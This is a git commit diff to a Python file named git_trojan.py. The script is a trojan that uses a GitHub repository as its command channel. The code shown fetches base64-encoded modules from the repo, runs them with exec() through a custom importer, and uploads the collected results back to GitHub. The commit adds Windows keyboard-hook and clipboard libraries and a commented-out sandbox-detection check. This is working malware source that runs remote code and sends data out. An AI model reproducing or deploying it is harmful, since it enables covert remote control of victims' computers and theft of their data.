8864c7a35c8924f963291c74e5bda7b8b47a413f
Allevon412 <41178870+Allevon412@users.noreply.github.com>
2019-06-05 00:17:13 -0700

    Update git_trojan.py

--- modules/git_trojan.py
+++ modules/git_trojan.py
@@ -7,10 +7,16 @@ import random
 import threading
 import queue
 import os
+import pyHook
+import win32clipboard
+import win32gui
+import win32api
+import win32ui
+import win32con
 
 from github3 import login
 
-trojan_id = "abc"
+trojan_id = "Win10_NonCompiled"
 
 trojan_config = "%s.json" %trojan_id
 data_path = "data/%s/" %trojan_id
@@ -57,8 +63,8 @@ def get_trojan_config():
     return config
 
 
-def store_module_result(data):
-
+def store_module_result(data, module):
+    print("storing data from module [*]%s" % module)
     gh, repo, branch = connect_to_github()
     remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
     repo.create_file(remote_path, "Commit message", base64.b64encode(data.encode()))
@@ -77,27 +83,31 @@ class GitImporter(object):
 
             if new_library is not None:
                 self.current_module_code = base64.b64decode(new_library)
+
                 return self
 
         return None
 
     def load_module(self, name):
-
         module = importlib.util.module_from_spec(importlib.util.find_spec(name))
-
+        #if name == 'sandbox_detect':
+         #   okay = exec(self.current_module_code, module.__dict__)
+          #  if okay == "We are okay!":
+           ##    return module
+        #else:
         exec(self.current_module_code, module.__dict__)
         sys.modules[name] = module
-
         return module
 
 
 def module_runner(module):
-    task_queue.put(1)
+    # task_queue.put(1)
     result = sys.modules[module].run()
-    task_queue.get()
 
     # store the result in our repo
-    store_module_result(result)
+    store_module_result(result, module)
+
+    # task_queue.get()
 
     return
 
@@ -116,4 +126,3 @@ while True:
             time.sleep(random.randint(1, 10))
 
     time.sleep(random.randint(1000, 10000))
-
